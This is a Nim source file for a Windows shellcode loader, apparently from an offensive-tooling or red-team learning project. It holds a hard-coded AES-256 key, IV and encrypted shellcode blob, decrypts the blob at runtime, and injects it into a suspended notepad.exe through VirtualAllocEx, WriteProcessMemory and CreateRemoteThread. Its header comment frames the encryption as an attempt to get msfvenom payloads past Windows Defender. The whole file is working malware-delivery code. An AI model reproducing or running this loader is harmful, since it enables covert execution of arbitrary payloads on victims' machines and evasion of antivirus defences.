#[
    Remote process injection with an AES-CBC encrypted payload.
    1. Use python_sc_to_nim.py to get shellcode to nim format
    2. Put shellcode in aes_encrypt.nim to generate random IV and key, and encrypted payload
    3. Put IV, key, and encrypted payload into injection2.nim

    This AES encryption does not allow msfvenom to pass windows defender.
]#
import os
import osproc
import nimcrypto
import sequtils
import strformat
import winim
import winim/lean

proc unpad*(src: seq[int]): seq[int] = 
    # get last byte
    let padLen = src[^1]

    # If last byte is 0, we have a problem
    if padLen == 0:
        echo("Error unpadding")
        quit(1)
    
    # get original source len
    let ogLen = src.len - padLen

    # copy src and remove the padding
    var unpadded = src
    unpadded.delete(ogLen, src.len)
    return unpadded


proc inject[I, T](shellcode: array[I, T]): void =
    let injectedProcess = startProcess("notepad.exe")
    injectedProcess.suspend()
    echo &"[+] Suspended Process: {injectedProcess.processID}"

    let procHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        false,
        cast[DWORD](injectedProcess.processID)
    )
    echo &"[+] Injected process handle: {procHandle}"

    let memPointer = VirtualAllocEx(
        procHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let writeProcess = WriteProcessMemory(
        procHandle,
        memPointer,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    echo &"[+] WriteProcessMemory: {bool(writeProcess)}"
    echo &"    Bytes written:      {bytesWritten}"

    let thHandle = CreateRemoteThread(
        procHandle,
        NULL, 
        0,
        cast[LPTHREAD_START_ROUTINE](memPointer),
        NULL, 
        0,
        NULL
    )

    echo &"[+] Thread Handle: {thHandle}"

when isMainModule:
    var iv = [57, 253, 123, 168, 234, 131, 202, 242, 134, 94, 177, 174, 233, 3, 193, 248]
    var key = [126, 188, 160, 0, 208, 30, 179, 123, 241, 79, 170, 111, 215, 214, 195, 234, 87, 98, 191, 151, 77, 164, 105, 117, 181, 71, 98, 36, 30, 54, 34, 133]
    var data = [34, 171, 115, 60, 242, 150, 170, 131, 227, 157, 74, 69, 243, 226, 60, 226, 239, 102, 185, 38, 173, 72, 246, 53, 101, 42, 181, 236, 55, 35, 183, 54, 47, 60, 35, 120, 202, 43, 156, 237, 194, 43, 227, 43, 114, 153, 139, 226, 112, 149, 189, 43, 125, 238, 98, 109, 117, 97, 31, 163, 223, 149, 253, 183, 193, 210, 66, 32, 99, 38, 118, 43, 155, 118, 163, 25, 41, 61, 195, 152, 15, 152, 10, 105, 169, 178, 92, 153, 220, 169, 47, 190, 137, 133, 35, 15, 240, 237, 158, 226, 168, 73, 27, 176, 43, 35, 51, 6, 147, 160, 115, 122, 75, 192, 224, 127, 58, 161, 26, 165, 197, 234, 32, 31, 217, 195, 195, 47, 42, 1, 179, 248, 134, 143, 29, 76, 219, 137, 179, 151, 19, 130, 47, 42, 51, 184, 176, 187, 55, 194, 67, 15, 168, 135, 173, 143, 80, 197, 116, 147, 90, 198, 223, 143, 4, 241, 53, 75, 174, 64, 134, 8, 188, 165, 118, 84, 60, 255, 182, 229, 72, 152, 196, 6, 182, 209, 180, 220, 34, 30, 140, 222, 160, 241, 7, 51, 224, 239, 246, 127, 64, 96, 25, 228, 61, 74, 143, 22, 197, 53, 19, 219, 164, 202, 236, 236, 173, 230, 177, 121, 11, 238, 3, 183, 86, 90, 35, 194, 232, 180, 99, 219, 193, 249, 41, 201, 212, 105, 83, 146, 253, 103, 203, 64, 252, 73, 117, 90, 74, 172, 99, 87, 1, 62, 212, 116, 0, 178, 58, 163, 185, 158, 121, 1, 221, 38, 99, 158, 102, 233, 114, 129, 28, 149, 254, 136, 239, 210, 51, 122, 114, 74, 102, 33, 133, 172, 115, 129, 225, 236, 48, 251, 218, 192, 103, 115, 14, 149, 122, 20, 122, 82, 106, 21]
    
    # copy encrypted data into enctext
    var enctext = newSeq[byte]()
    for i in 0 ..< data.len:
        enctext.add(data[i].byte)
        
    # copyMem(addr enctext[0], addr data[0], len(data))
    
    # convert key int array to byte array
    var keyB: array[key.len, byte]
    for i in low(key) .. high(key):
        keyB[i] = key[i].byte

    # convert iv int array to byte array
    var ivB: array[iv.len, byte]
    for i in low(iv) .. high(iv):
        ivB[i] = iv[i].byte
    
    # create decrypted text buffer
    var dectext = newSeq[byte]()
    for i in 0 ..< data.len:
        dectext.add(0.byte)

    # create decryption context
    var dctx: CBC[aes256]
    dctx.init(keyB, ivB)
    dctx.decrypt(enctext, dectext)
    dctx.clear()

    # convet dectext to int
    var preUnpadded = newSeq[int]()
    for i in 0 ..< dectext.len:
        preUnpadded.add(dectext[i].int)
    
    var unpadded = unpad(preUnpadded)

    # unpadded to shellcode
    var sc: array[4096, byte]
    for i in 0 ..< unpadded.len:
        sc[i] = unpadded[i].byte

    
    inject(sc)